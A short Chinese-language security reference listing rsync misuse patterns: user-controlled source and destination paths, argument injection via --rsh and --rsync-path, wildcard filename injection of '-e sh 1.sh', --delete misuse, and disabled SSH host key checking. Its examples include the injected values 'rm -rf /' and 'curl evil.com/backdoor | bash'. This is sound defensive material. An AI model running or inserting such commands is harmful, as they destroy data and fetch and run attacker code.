# rsync 命令安全风险

## 涉及的安全问题
- 命令注入（参数注入）
- 上传下载（任意目录同步、数据泄露）
- 跨目录读写（源/目标路径可控）
- 操作任意文件（覆盖/删除任意文件）
- 完整性校验缺失（SSH 主机验证绕过）

## 高危模式

### 跨目录读写 — 源/目标路径可控
```bash
rsync -avz "$USER_SOURCE" "$USER_DEST"
# USER_SOURCE = "/etc/" → 泄露整个 /etc
# USER_DEST = "/" → 写入根目录

rsync "$USER_SRC" /backup/
# USER_SRC = "/etc/" → 备份整个 /etc
```

### 命令注入 — 参数注入
```bash
rsync $OPTIONS "$SRC" "$DST"
# OPTIONS = "--rsh=rm -rf /" → 通过 --rsh 执行命令

# 安全写法
rsync -- "$SRC" "$DST"
```

### 操作任意文件 — --delete 删除
```bash
rsync -avz --delete "$SRC" "$DST"
# 如果 DST 可控，可删除目标目录中的任意文件
```

### 命令注入 — -e / --rsh 通配符利用

当 rsync 命令的 target 含通配符 `*` 且目录可写时，攻击者可创建特殊文件名注入 `-e` 参数：

```bash
# 脚本中常见的危险写法
rsync * 172.5.119.198:/home/aaron

# 攻击者在当前目录创建：
# 文件名: -e sh 1.sh
# 文件名: 1.sh (内容为恶意命令)

# rsync 展开 * 后实际执行：
# rsync -e sh 1.sh 1.sh 172.5.119.198:/home/aaron
# -e 指定的 sh 1.sh 被执行

# 注意：不能直接在 -e 后面写脚本命令（跟 tar 不同），需要指定脚本文件
```

### 命令注入 — --rsync-path 参数

```bash
# --rsync-path 在远程机器上执行指定命令
rsync -avR --rsync-path="cd /a/b && rsync" host:c/d /e/
# 如果 --rsync-path 参数可控，可注入任意命令

rsync -av --rsync-path="$USER_CMD" "$SRC" "$HOST:$DST"
# USER_CMD = "curl evil.com/backdoor | bash && rsync"
```

### 完整性校验缺失 — SSH 主机验证绕过
```bash
rsync -e "ssh -o StrictHostKeyChecking=no" "$SRC" "$HOST:$DST"
rsync -e "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" "$SRC" "$HOST:$DST"
```
